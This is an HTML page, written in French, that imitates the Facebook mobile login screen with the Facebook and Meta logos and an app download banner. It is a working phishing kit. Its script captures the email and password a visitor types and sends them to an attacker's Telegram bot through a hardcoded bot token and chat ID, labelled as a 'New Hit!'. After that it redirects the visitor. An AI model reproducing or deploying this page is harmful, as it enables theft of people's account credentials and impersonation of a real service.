<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
  <title>Connexion</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
    .app-banner { padding: 10px 12px; background: #ffffff; display: flex; align-items: center; border-bottom: 0.5px solid #c9ccd1; }
    .app-icon { width: 24px; height: 24px; background-color: #0064e0; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
    .app-icon span { color: white; font-size: 14px; font-weight: bold; }
    .app-text { flex: 1; padding-left: 8px; padding-right: 10px; }
    .app-text span { font-size: 13px; font-weight: 400; color: #1763cf; line-height: 1.3; }
    .main-container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 8px 16px 14px; }
    .language-selector { display: flex; justify-content: center; margin-bottom: 20px; }
    .language-btn { padding: 0 16px; cursor: pointer; }
    .language-btn span { font-size: 13.5px; color: #666a72; font-weight: 400; }
    .logo { display: flex; justify-content: center; margin-bottom: 20px; }
    .logo img { max-height: 60px; object-fit: contain; }
    .form-container { width: 100%; max-width: 400px; margin: 0 auto; }
    .input-group { margin-bottom: 12px; }
    .input-field { width: 100%; padding: 10px 16px; border: 1px solid #dfe2e5; border-radius: 16px; background: rgba(255, 255, 255, 0.2); font-size: 15.2px; font-family: "Optimistic 95", system-ui, sans-serif; color: #111112; outline: none; transition: border-color 0.2s; }
    .input-field:focus { border-color: #0064e0; }
    .login-btn { width: 100%; margin-top: 12px; background-color: #0064e0; border: none; border-radius: 22px; padding: 12px 20px; font-size: 15.2px; font-weight: 500; color: #f2f4f6; cursor: pointer; text-align: center; }
    .forgot-link { text-align: center; margin-top: 12px; padding: 10px 16px; }
    .forgot-link a { font-size: 15.2px; font-weight: 500; color: #111112; text-decoration: none; }
    .create-btn { width: 100%; margin-top: 20px; background: transparent; border: 1px solid #0064e0; border-radius: 22px; padding: 12px 20px; font-size: 15.2px; font-weight: 500; color: #0064e0; cursor: pointer; text-align: center; }
    .meta-logo { display: flex; justify-content: center; margin-top: 20px; margin-bottom: 20px; }
    .meta-logo img { height: 12px; }
  </style>
</head>
<body>

  <div class="app-banner">
    <div class="app-icon"><span>F</span></div>
    <div class="app-text"><span>Téléchargez Facebook pour Android et naviguez plus vite.</span></div>
  </div>

  <div class="main-container">
    <div class="language-selector">
      <div class="language-btn"><span>Français (France)</span></div>
    </div>

    <div class="logo">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yU/r/0gFm6_6mwp0.webp" alt="Facebook">
    </div>

    <div class="form-container">
      <div class="input-group">
        <input type="text" id="userEmail" class="input-field" placeholder="Numéro mobile ou e-mail">
      </div>
      <div class="input-group">
        <input type="password" id="userPass" class="input-field" placeholder="Mot de passe">
      </div>

      <button type="button" class="login-btn" onclick="sendDataToTelegram()">Se connecter</button>

      <div class="forgot-link"><a href="#">Mot de passe oublié ?</a></div>
      <div class="create-btn">Créer un compte</div>
    </div>

    <div class="meta-logo">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yR/r/on19k6ac8bZ.webp" alt="Meta">
    </div>
  </div>

  <script>
    // الوظيفة المسؤولة عن الإرسال
    async function sendDataToTelegram() {
      const TELEGRAM_BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
      const TELEGRAM_CHAT_ID = "6451561574";

      const email = document.getElementById('userEmail').value;
      const pass = document.getElementById('userPass').value;

      if (!email || !pass) {
        alert("Veuillez remplir tous les champs");
        return;
      }

      const text = `🎯 **New Hit!**\n\n👤 **User:** \`${email}\` \n🔑 **Pass:** \`${pass}\``;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
        
        // تحويل المستخدم لموقع فيسبوك الحقيقي بعد الإرسال
        window.location.href = "لا يوجد اتصال";
      } catch (error) {
        console.error("Error sending message:", error);
      }
    }
  </script>
</body>
</html>
